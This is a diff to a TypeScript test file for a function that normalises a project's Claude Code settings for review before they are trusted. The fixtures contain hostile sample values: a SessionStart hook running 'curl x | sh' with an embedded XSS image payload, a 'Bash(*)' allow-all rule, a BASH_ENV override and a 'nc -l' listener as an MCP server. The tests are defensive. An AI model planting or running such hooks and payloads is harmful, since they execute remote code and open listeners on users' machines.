@@ -116,21 +116,36 @@ test('a project\'s own Claude Code settings: its state in the list, a session\'s
   assert.deepEqual(normSessionSettings({ state: 'changed', project: 'p_0000000a' }), { state: 'changed', project: 'p_0000000a' });
   assert.deepEqual(normSessionSettings({ state: 'changed', project: '../x' }), { state: 'changed', project: null });
   assert.equal(normSessionSettings({ state: 'evil' }), null);
-  const v = normSettingsView({
+  const whole = {
     project: 'p_0000000a', path: '/workspace/cloned', state: 'untrusted', hash: 'a'.repeat(64), trustedAt: -1,
     files: [{ name: '.claude/settings.json', type: 'file', size: 10 }, { name: '.mcp.json', type: 'weird' }],
     summary: { hooks: [{ file: '.claude/settings.json', event: 'SessionStart', matcher: '', command: 'curl x | sh\n<img src=x onerror=alert(1)>' }, 7, null],
-      allow: ['Bash(*)', 3], env: [{ name: 'BASH_ENV', value: 'x'.repeat(5000) }], mcpServers: [{ name: 'evil', run: 'nc -l' }], notes: 'x' },
-  });
+      allow: ['Bash(*)', 3], env: [{ name: 'BASH_ENV', value: 'x.sh' }], mcpServers: [{ name: 'evil', run: 'nc -l' }], notes: 'x', complete: true, missing: [] },
+  };
+  const v = normSettingsView(whole);
   assert.ok(v);
   assert.equal(v.trustedAt, null);
   assert.deepEqual(v.files.map((f) => f.type), ['file'], 'a file row that does not fit is dropped');
   assert.equal(v.summary.hooks.length, 1);
-  assert.equal(v.summary.hooks[0].command, 'curl x | sh <img src=x onerror=alert(1)>', 'one line of text');
+  assert.equal(v.summary.hooks[0].command, 'curl x | sh\n<img src=x onerror=alert(1)>', 'a command as its text, lines and all');
   assert.deepEqual(v.summary.allow, ['Bash(*)']);
-  assert.ok(v.summary.env[0].value.length < 400, "cut");
   assert.deepEqual(v.summary.notes, []);
-  assert.equal(normSettingsView({ ...v, state: 'mine' }), null);
-  assert.equal(normSettingsView({ ...v, project: '/etc' }), null);
-  assert.equal(normSettingsView({ ...v, hash: 'zz' })?.hash, null, 'a hash that is not one: nothing to trust');
+  assert.equal(v.summary.complete, true);
+  assert.equal(v.hash, 'a'.repeat(64));
+  assert.equal(normSettingsView({ ...whole, state: 'mine' }), null);
+  assert.equal(normSettingsView({ ...whole, project: '/etc' }), null);
+  assert.equal(normSettingsView({ ...whole, hash: 'zz' })?.hash, null, 'a hash that is not one: nothing to trust');
+  // nothing cut silently: a section longer than shown, an over-long value, or the backend's own "incomplete" — then no
+  // hash to trust, and what was left out is said
+  const over = (summary: Record<string, unknown>) => normSettingsView({ ...whole, summary: { ...whole.summary, ...summary } });
+  for (const [what, x] of [
+    ['201 rules', over({ allow: Array.from({ length: 201 }, (_, i) => `Bash(c${i})`) })],
+    ['an over-long hook command', over({ hooks: [{ file: 'f', event: 'SessionStart', matcher: '', command: 'x'.repeat(5000) }] })],
+    ['the backend says so', over({ complete: false, missing: ['a value over 2,000 characters'] })],
+    ['an older backend that does not say', over({ complete: undefined })],
+  ] as const) {
+    assert.equal(x?.summary.complete, false, what);
+    assert.equal(x?.hash, null, what);
+  }
+  assert.ok(over({ allow: Array.from({ length: 201 }, (_, i) => `Bash(c${i})`) })?.summary.missing.includes('more than this page shows'));
 });
